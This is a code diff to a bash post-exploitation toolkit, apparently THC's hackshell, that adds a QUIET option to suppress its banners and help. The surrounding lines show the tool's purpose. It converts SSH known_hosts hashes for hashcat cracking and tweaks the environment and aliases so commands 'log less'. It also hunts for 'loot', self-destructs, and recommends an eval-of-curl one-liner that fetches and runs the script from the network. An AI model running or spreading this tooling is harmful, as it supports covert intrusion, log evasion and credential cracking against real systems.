@@ -184,7 +184,7 @@ _ssh-known-hosts2hashcat() {
         echo "$(echo "${arr[1]}" | base64 -d | xxd -p):$(echo "${arr[0]}" | base64 -d | xxd -p)"
         ((n++))
     done
-    echo >&2 "Found ${n} hashes. Now use:
+    echo -e >&2 "Found ${n} hashes. Now use:
   ${CDC}hashcat -m 160 --quiet --hex-salt known_hosts_converted.txt -a0 hosts.txt${CN}
 or try all IPv4:
   ${CDC}curl -SsfL https://github.com/chris408/known_hosts-hashcat/raw/refs/heads/master/ipv4_hcmask.txt -O
@@ -1802,7 +1802,7 @@ hs_exit() {
             _hs_destruct
         fi
     }
-    [ -t 1 ] && echo -e "${CW}>>>>> 📖 More tips at https://thc.org/tips${CN} 😘"
+    [ -z "$QUIET" ] && [ -t 1 ] && echo -e "${CW}>>>>> 📖 More tips at https://thc.org/tips${CN} 😘"
     kill -9 $$
 }
 
@@ -2134,21 +2134,23 @@ hs_init "$0"
 hs_init_alias
 hs_init_shell
 
-xhelp
+[ -z "$QUIET" ] && {
+    xhelp
 
-### Finishing
-echo -e ">>> Type ${CDC}xhome${CN} to set HOME=${CDY}${XHOME}${CN}"
-echo -e ">>> Tweaking environment variables to log less     ${CN}[${CDG}DONE${CN}]"
-echo -e ">>> Creating aliases to make commands log less     ${CN}[${CDG}DONE${CN}]"
-echo -e ">>> ${CG}Setup complete. ${CF}No data was written to the filesystem${CN}"
+    ### Finishing
+    echo -e ">>> Type ${CDC}xhome${CN} to set HOME=${CDY}${XHOME}${CN}"
+    echo -e ">>> Tweaking environment variables to log less     ${CN}[${CDG}DONE${CN}]"
+    echo -e ">>> Creating aliases to make commands log less     ${CN}[${CDG}DONE${CN}]"
+    echo -e ">>> ${CG}Setup complete. ${CF}No data was written to the filesystem${CN}"
+    hs_info
 
-hs_info
+    # Warning if thc.org is used
+    [ -n "$_HSURLORIGIN" ] && HS_WARN "Better use: ' ${CDC}eval \"\$(curl -SsfL ${_HSURL})\"${CDM}'${CN}"
 
-# Warning if thc.org is used
-[ -n "$_HSURLORIGIN" ] && HS_WARN "Better use: ' ${CDC}eval \"\$(curl -SsfL ${_HSURL})\"${CDM}'${CN}"
+    ### Check for obvious loots
+    lootlight
+}
 
-### Check for obvious loots
-lootlight
 
 # unset all functions that are no longer needed.
 unset -f hs_init hs_init_alias hs_init_dl hs_init_shell
